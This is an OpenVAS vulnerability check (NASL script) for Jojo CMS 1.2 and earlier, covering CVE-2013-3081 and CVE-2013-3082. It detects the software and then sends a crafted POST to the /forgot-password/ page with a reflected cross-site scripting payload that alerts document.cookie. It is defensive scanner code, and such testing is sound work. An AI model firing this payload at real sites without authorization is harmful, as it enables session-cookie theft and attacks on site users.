###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_jojo_cms_mult_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Jojo CMS Multiple Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to execute arbitrary SQL
  commands and execute arbitrary HTML and script code in a user's browser
  session in the context of an affected website.
  Impact Level: Application";

tag_affected = "Jojo CMS version 1.2 and prior";
tag_insight = "Multiple flaws due to,
  - An insufficient filtration of user-supplied input passed to the
    'X-Forwarded-For' HTTP header in '/articles/test/' URI.
  - An insufficient filtration of user-supplied data passed to 'search' HTTP
    POST parameter in '/forgot-password/' URI.";
tag_solution = "Update to Jojo CMS 1.2.2 or later,
  For updates refer to  http://www.jojocms.org";
tag_summary = "This host is installed with Jojo CMS and is prone to multiple
  vulnerabilities.";

if(description)
{
  script_id(803703);
  script_version("$Revision: 11 $");
  script_cve_id("CVE-2013-3081", "CVE-2013-3082");
  script_bugtraq_id(59934, 59933);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-05-23 15:54:25 +0530 (Thu, 23 May 2013)");
  script_name("Jojo CMS Multiple Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.osvdb.org/93438");
  script_xref(name : "URL" , value : "http://www.osvdb.org/93437");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/53418");
  script_xref(name : "URL" , value : "https://www.htbridge.com/advisory/HTB23153");
  script_xref(name : "URL" , value : "https://xforce.iss.net/xforce/xfdb/84285");

  script_description(desc);
  script_summary("Check if Jojo CMS is vulnerable to XSS vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
url = "";
req = "";
res = "";
port = "";
sndReq = "";
rcvRes = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Iterate over the possible directories
foreach dir (make_list("", "/jojo", "/cms", cgi_dirs()))
{
  ## Request for the search.cgi
  sndReq = http_get(item:string(dir, "/"), port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq, bodyonly:TRUE);

  ## confirm the Application
  if(rcvRes && '"Jojo CMS' >< rcvRes &&
     "http://www.jojocms.org" >< rcvRes)
  {
    ## Construct the POST data
    postdata = "type=reset&search=%3E%3Cscript%3Ealert%28document.cookie" +
               "%29%3B%3C%2Fscript%3E&btn_reset=Send";

    req = string("POST ", dir, "/forgot-password/ HTTP/1.1\r\n",
                 "Host: ", get_host_name(), "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postdata), "\r\n",
                 "\r\n", postdata);

    res = http_keepalive_send_recv(port:port, data:req);

    if(res && "><script>alert(document.cookie);</script>" >< res
       && '"Jojo CMS' >< res)
    {
      security_hole(port);
      exit(0);
    }
  }
}
